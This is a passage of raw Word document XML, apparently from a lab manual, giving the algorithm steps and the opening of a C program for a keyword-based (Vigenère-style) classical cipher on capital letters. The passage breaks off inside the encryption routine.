        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng from</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he 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4  For each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char</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">do ch </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>od 65 or ch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>od 97 and s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ore resu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n s[] arra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="8" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:ind w:left="340" w:right="761" w:hanging="240"/>
      </w:pPr>
      <w:r>
        <w:t>5. For each va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>e s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ore </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>[] arr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ake</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ch </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>od 26 and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">add </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ue </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>65 &amp;</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ore </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher[]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>arra</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-16"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>6. Pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>con</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>er[] array</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>o get</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>pher</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>g</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ven p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>.</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rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>//T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s program</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>works for p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>and keyword en</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ered</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n C</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>al</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er on</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>y</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ude&lt;s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ude&lt;s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>ng.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>#</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>nc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ude&lt;s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>b.h&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>char p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[20],keyword[20],c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>phe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>[20</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>d encryp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>vo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rP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nt</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>j</w:t>
      </w:r>
      <w:r>
        <w:t>=0,n,k;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="810" w:right="5127"/>
      </w:pPr>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">er </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ext</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>"); scanf("%s",p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:t>; n=s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>en(p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ex</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>); pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>f(</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>\</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">er </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>keyword :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>"); scanf("%s",keyword); k=s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>en(keyword);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="7" w:line="240" w:lineRule="exact"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1680" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="29"/>
        <w:ind w:left="580" w:right="-56"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(n&gt;k)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="542" w:right="528"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="1" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="column"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
